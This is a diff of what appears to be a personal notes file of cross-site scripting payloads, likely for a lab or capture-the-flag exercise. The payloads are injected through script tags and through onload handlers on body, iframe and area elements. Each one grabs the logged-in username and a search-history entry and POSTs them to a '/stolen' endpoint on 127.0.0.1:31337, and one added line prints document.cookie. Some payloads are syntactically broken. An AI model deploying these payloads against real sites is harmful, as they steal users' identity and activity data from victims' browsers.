@@ -48,11 +48,19 @@ xhr.setRequestHeader('Content-Type', '');xhr.send(JSON.stringify({value: value})
 //ajax to get request
 window.location.href=send;
 
+console.log(decodeURIComponent(document.cookie))
+
 Number 1:
 <script>window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}</script>
 Number 2:
 <BODY ONLOAD="var xhr = new XMLHttpRequest();var url='http://127.0.0.1:31337/stolen';var params='user='+String(document.getElementById('logged-in-user').innerHTML)+'&last_search='+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open('POST', send, true);console.log(send);xhr.send()">
 Number 3:
+<iframe onload="myFunction()" src="/default.asp"></iframe>
+<iframe onload="var xhr = new XMLHttpRequest();var url='http://127.0.0.1:31337/stolen';var params='user='+String(document.getElementById('logged-in-user').innerHTML)+'&last_search='+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open('POST', send, true);console.log(send);xhr.send()">
+<a href="#" onclick="someFunction();" return false;">LINK</a>
+
+
+<area ONLOAD ="var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()});">
 
 <!---->window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}<!---->
 
